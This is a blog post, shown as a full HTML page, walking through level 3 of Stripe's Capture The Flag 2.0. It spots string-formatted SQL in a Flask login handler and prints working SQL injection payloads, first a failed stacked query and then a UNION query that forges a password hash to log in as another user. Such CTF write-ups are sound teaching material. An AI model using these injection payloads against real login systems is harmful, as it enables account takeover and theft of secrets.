<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <title>
    Stripe Capture The Flag 2.0 - Problem 3 // Qiu&#39;s Quibble
  </title>

  <link href="http://gmpg.org/xfn/11" rel="profile">
<meta http-equiv="content-type" content="text/html; charset=utf-8">


<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

<meta name="description" content="">
<meta name="keywords" content="">
<meta name="author" content="">
<meta name="generator" content="Hugo 0.36" />

  <meta property="og:title" content="Stripe Capture The Flag 2.0 - Problem 3" />
<meta property="og:description" content="" />
<meta property="og:type" content="website" />
<meta property="og:locale" content="en_US" />
<meta property="og:url" content="http://blog.idempotent.ca/2012/09/19/stripe-capture-the-flag-2.0---problem-3/" />


  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/base-min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/pure-min.css">
  
  
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/grids-responsive-min.css">
  
  

  <link rel="stylesheet" href="http://blog.idempotent.ca/css/redlounge.css">
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
  <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>

  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
  <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.png">

  
  <link href="" rel="alternate" type="application/rss+xml" title="Qiu&#39;s Quibble" />

    
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/tomorrow-night-bright.min.css">
  
  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
  <script>hljs.initHighlightingOnLoad();</script>


  

  

  

  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', "UA-62238742-2", 'auto');
  ga('send', 'pageview');
</script>

</head>

<body>
	

	<div id="layout" class="pure-g">
    <div class="sidebar pure-u-1 pure-u-md-1-4">
  <div class="header">
    

	

    <h1 class="brand-title">Qiu&#39;s Quibble</h1>
    <h2 class="brand-tagline">Blog about nothing and everything</h2>

    <nav class="nav">
      <ul class="nav-list">
        <li class="nav-item"><span class="nav-item-separator">//</span><a href="http://blog.idempotent.ca">Home</a></li>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/about/me/">about</a></li>
        
          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/starred/">starred posts</a></li>
        
      </ul>
    </nav>

    
    <div class="social-buttons">
      
        
        <a href="https://github.com/kevinjqiu" target="_blank"><i class='fa fa-github'></i></a>
        
      
        
        <a href="http://blog.idempotent.ca/index.xml" target="_blank"><i class='fa fa-rss'></i></a>
        
      
        
        <a href="https://twitter.com/kevinjqiu" target="_blank"><i class='fa fa-twitter'></i></a>
        
      
      
    </div>
    

  </div>
</div>

	
	

    <div class="content pure-u-1 pure-u-md-3-4">
		<a name="top"></a>
		

		
			
		    <div id="toc" class="pure-u-1 pure-u-md-1-4">
				<small class="toc-label">Contents</small>
		   	 	<nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#level-3">Level 3</a>
<ul>
<li><a href="#take-1">Take 1</a></li>
<li><a href="#take-2">Take 2</a></li>
</ul></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul></li>
</ul>
</nav>
		    </div>
		    
	    
  		<section class="post">
            <h1 class="post-title">
              <a href="/2012/09/19/stripe-capture-the-flag-2.0---problem-3/">Stripe Capture The Flag 2.0 - Problem 3</a>
            </h1>
            <h3 class="post-subtitle">
            	
            </h3>
            
            	<span class="post-date">
                	<span class="post-date-day"><sup>19</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Sep</span> <span class="post-date-year">2012</span>
            	</span>
            	
            
            	
            

			
			
				<div class="post-categories">
				
					<a class="post-category post-category-ctf" href="http://blog.idempotent.ca/categories/ctf">ctf</a>
				
				</div>
			

			

			

            

<h2 id="level-3">Level 3</h2>

<p>Finally we get to level 3. Here&rsquo;s the setup:</p>

<pre><code>After the fiasco back in Level 0, management has decided to fortify the Secret Safe into an unbreakable solution (kind of like Unbreakable Linux). The resulting product is Secret Vault, which is so secure that it requires human intervention to add new secrets.

A beta version has launched with some interesting secrets (including the password to access Level 4)
</code></pre>

<p>Here&rsquo;s the code for the server (Python finally!)
<script src="//gist.github.com/kevinjqiu/3747632.js"></script></p>

<p>&hellip;and here&rsquo;s the front-end:
<script src="//gist.github.com/kevinjqiu/3747637.js"></script></p>

<p>From the description, we know that we need to break into bob&rsquo;s account to retrieve the password to level 4, although breaking into eve and mallory&rsquo;s accounts are attempting :) Afterall, who wouldn&rsquo;t want to know the proof of <a href="http://en.wikipedia.org/wiki/P_versus_NP_problem">P=NP</a> or how to make a <a href="http://en.wikipedia.org/wiki/Perpetual_motion_machine">perpetual motion machine</a>?</p>

<p>Anyhow, the front-end is a typical login page: you get username and password input fields, and they&rsquo;re sent off (via POST) to a server script.
The server is a simple Flask app that gets the user input, checks them against a table of username and salted password hashes.</p>

<p>The <code>login()</code> function is where all the action takes place. Line 86 quickly caught my eyes:</p>

<pre><code class="language-python">query = &quot;&quot;&quot;SELECT id, password_hash, salt FROM users WHERE username = '{0}' LIMIT 1&quot;&quot;&quot;.format(username)
cursor.execute(query)
</code></pre>

<p>This is an alarming pattern of formatting a string and sending it off to <code>cursor.execute()</code>. Python&rsquo;s string <code>format()</code> method is just another way of interopolation. It&rsquo;s exactly the same as <code>&quot;&quot;&quot;SELECT id, password_hash, salt FROM user WHERE username = %s&quot;&quot;&quot; % username&quot;&quot;&quot;</code>.</p>

<p>Now that we found the vulnerability, we need to find a way exploit it.</p>

<h3 id="take-1">Take 1</h3>

<p>Normally, with SQL injection, you craft an input to terminate the previous statement, and inject the statement you want it to execute. Reading the code, it&rsquo;s getting the user&rsquo;s password hash and salt for the given user, and check it against the input hash and salt. The hashing method is <a href="http://en.wikipedia.org/wiki/SHA-2">sha256</a>. With Python, we can quickly pre-calculate a salted hash to inject. Here&rsquo;s an example, with password <code>1</code> and salt <code>a</code>.</p>

<pre><code class="language-bash">python -c &quot;import hashlib; print hashlib.sha256('1'+'a').hexdigest()&quot;
</code></pre>

<p>and we get <code>a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65</code>.</p>

<p>The statement we really want it to execute is:</p>

<pre><code class="language-sql">SELECT id, 'a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65', 'a' FROM users WHERE username = 'bob'
</code></pre>

<p>so when we put &lsquo;1&rsquo; in the password input box, we will get the server to run sha246 on &lsquo;1&rsquo; + &lsquo;a&rsquo;, and check it against the hash that we fed in. The entire query gets executed wil look like this (with the middle line being the <code>username</code> we feed in):</p>

<pre><code class="language-sql">SELECT id, password_hash, salt FROM users WHERE username = '
'; SELECT id,  'a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65', 'a' FROM users WHERE username='bob
' LIMIT 1
</code></pre>

<p>How does that faire?</p>

<p>Unfortunately, we get a stack trace in the traceback:</p>

<pre><code>Traceback (most recent call last):
  File &quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;, line 1689, in wsgi_app
    response = self.make_response(self.handle_exception(e))
  File &quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;, line 1687, in wsgi_app
    response = self.full_dispatch_request()
  File &quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;, line 1360, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File &quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;, line 1358, in full_dispatch_request
    rv = self.dispatch_request()
  File &quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;, line 1344, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File &quot;/Users/kevin/src/ctf/level03-code/secretvault.py&quot;, line 91, in login
    cursor.execute(query)Warning: You can only execute one statement at a time.
</code></pre>

<p><code>cursor</code> cannot run more than one statement at a time! Smart, eh?</p>

<h3 id="take-2">Take 2</h3>

<p>So the trick here is to use exactly 1 statement to inject our crafted data. We still want this to be returning the same fields. What if I <code>UNION</code> two queries, with the second query selecting the injected data?</p>

<p>So something like this (the middle line is the one we inject as <code>username</code>):</p>

<pre><code class="language-sql">SELECT id, password_hash, salt FROM users WHERE username = '
bob' UNION select id, 'a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65', 'a' FROM users WHERE username = 'bob
' LIMIT 1
</code></pre>

<p>Submit, and boom:</p>

<pre><code>Welcome back! Your secret is: &quot;...&quot; (Log out)
</code></pre>

<h2 id="conclusion">Conclusion</h2>

<p>This is a canonical SQL injection. Again, NEVER trust user input. Always sanitize user input.</p>

	
			

			

			
				<div class="paging">
					<span class="paging-label">More Reading</span>
					
					<div class="paging-newer">
						<span class="dark-red">Newer</span><span class="decorative-marker">//</span>
						<a class="paging-link" href="/2013/11/20/first-dip-into-golangs-concurrency/">First dip into Golang&#39;s concurrency</a>
		            </div>
		            

					
					<div class="paging-older">
						<span class="dark-red">Older</span><span class="decorative-marker">//</span>
			            <a class="paging-link" href="/2012/09/12/stripe-capture-the-flag-2.0---problem-2/">Stripe Capture The Flag 2.0 - Problem 2</a>
		            </div>
		            
	            </div>
            
          </section>
          
          	<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "idempotentca" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
          
        
      <div class="footer">
	<hr class="thin" />
	<div class="pure-menu pure-menu-horizontal pure-menu-open">
		<ul class="footer-menu">
		
		</ul>
	</div>

	<p>&copy; 2018. All rights reserved.</p>
</div>

    </div>
  </div>
	

	

  
</body>
</html>
